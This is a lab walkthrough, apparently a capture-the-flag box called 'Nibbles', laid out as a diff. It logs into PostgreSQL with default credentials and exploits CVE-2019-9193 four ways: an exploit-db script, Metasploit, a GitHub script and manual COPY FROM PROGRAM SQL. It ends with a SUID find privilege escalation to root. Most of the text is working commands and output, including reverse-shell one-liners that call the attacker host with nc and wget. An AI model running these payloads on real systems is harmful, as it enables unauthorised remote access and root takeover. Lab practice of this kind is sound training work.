@@ -1,0 +1,171 @@
+																							               Nibbles Walkthrough
+																										
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.204.47
+export IP=192.168.204.47
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+5437/tcp open   pmip6-data
+
+nmap -Pn -n -sC -sV -p21,22,80,5437 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
+|_http-title: Enter a title, displayed at the top of the window.
+|_http-server-header: Apache/2.4.38 (Debian)
+5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
+Service Info: OSs: Unix, Linux
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+ Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+ <!-- nothing -->
+nikto --url $IP
+ <!-- nothing -->
+
+Port 80 
+ <!-- nothing -->
+ 
+Port 5437 - PostgreSQL
+Let's try some default credentials
+postgres / postgres
+
+# Connect to PostgreSQL DB
+psql -h $IP -U postgres -p 5437
+postgres
+
+# List databases
+\list
+    Name 
+ postgres
+ template0
+ template1
+
+# Check your user roles / privileges
+\du+
+                                          List of roles
+ Role name |                         Attributes                                                   | Member of | Description 
+--------------+----------------------------------------------------------------------------+--------------+-------------
+ postgres   | Superuser, Create role, Create DB, Replication, Bypass RLS  |      {}
+ 
+# Let's search online for known exploits. 
+searchsploit postgresql
+PostgreSQL 9.3 - COPY FROM PROGRAM Command Execution (Metasploit)                                                                              | multiple/remote/46813.rb
+PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)                                                                                      | multiple/remote/50847.py
+
+# Let's try both methods
+Method 1: (exploit-db)
+searchsploit -m multiple/remote/50847.py
+
+# Make sure you add the proper values for host, port, database, username and password.
+cat 50847.py
+	def parseArgs():
+		parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-11.7 Authenticated Remote Code Execution')
+		parser.add_argument('-i', '--ip', nargs='?', type=str, default='192.168.204.47', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
+		parser.add_argument('-p', '--port', nargs='?', type=int, default=5437, help='The port of the PostgreSQL DB [Default: 5432]')
+		parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
+		parser.add_argument('-c', '--command', nargs='?', help='System command to run')
+		parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
+		parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
+		parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
+		args = parser.parse_args()
+		return args
+    
+# Run the exploit
+python3 50847.py 
+
+[+] Connecting to PostgreSQL Database on 192.168.204.47:5437
+[+] Connection to Database established
+[+] Checking PostgreSQL version
+[+] PostgreSQL 11.7 is likely vulnerable
+[+] Add the argument -c [COMMAND] to execute a system command
+
+python3 50847.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.5 21 >/tmp/f'
+nc -lvnp 21                                                                      # As usual, use a port that is already used by the server to avoid firewalls.
+listening on [any] 21 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.204.47] 58794
+/bin/sh: 0: can't access tty; job control turned off
+$ Got shell 
+
+Method 2: (Metasploit)
+
+search postgresql
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+set database template1
+set rhosts 192.168.204.47
+set rport 5437
+set username postgres
+set password postgres
+set lhost 192.168.45.5
+set lport 21
+run
+
+[*] Started reverse TCP handler on 192.168.45.5:21 
+[*] 192.168.204.47:5437 - 192.168.204.47:5437 - PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
+[*] 192.168.204.47:5437 - Exploiting...
+[+] 192.168.204.47:5437 - 192.168.204.47:5437 - urs dropped successfully
+[+] 192.168.204.47:5437 - 192.168.204.47:5437 - urs created successfully
+[+] 192.168.204.47:5437 - 192.168.204.47:5437 - urs copied successfully(valid syntax/command)
+[+] 192.168.204.47:5437 - 192.168.204.47:5437 - urs dropped successfully(Cleaned)
+[*] 192.168.204.47:5437 - Exploit Succeeded
+[*] Command shell session 2 opened (192.168.45.5:21 -> 192.168.204.47:58788) at 2023-04-08 15:34:59 -0400
+
+id
+uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+
+Method 3: Github - Squid22
+
+https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py
+
+nano postgresql_rce.py
+RHOST = '192.168.204.47'
+RPORT = 5437
+LHOST = '192.168.45.5'
+LPORT = 21
+USER = 'postgres'
+PASSWD = 'postgres'
+
+python3 postgresql_rce.py
+nc -lvnp 21                                       # Got shell !
+
+Method 4: Manual RCE
+# For this to work, we will copy the netcat binary into the location of our python server because we will gave to download it on your target to connect back.
+
+cp /usr/bin/nc .
+python3 -m http.server 80
+
+
+psql -h $IP -U postgres -p 5437
+postgres
+\list                                                                                                                      # List databases
+\c postgres;                                                                                                        # Use postgres database
+DROP TABLE IF EXISTS cmd_exec;                                                                        # Get rid of the table cmd_exec  
+CREATE TABLE cmd_exec(cmd_output text);                                               # Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'wget http://192.168.45.5/nc';                           # Download the netcat binary from our python server
+DELETE FROM cmd_exec;
+COPY cmd_exec FROM PROGRAM 'nc -n 192.168.45.5 5437 -e /usr/bin/bash';       # Use the netcat binary to establish a shell back
+
+nc -lvnp 5437                                                                                                     # Got shell
+
+ 
+
+Privilege escalation
+
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/find
+
+# Easiest root of my life, gtfobins
+
+/usr/bin/find . -exec /bin/sh -p \; -quit
+whoami
+root
+cat /root/proof.txt                                           # Flag: 260468c4a3c1f32978c301a5cafdf65a
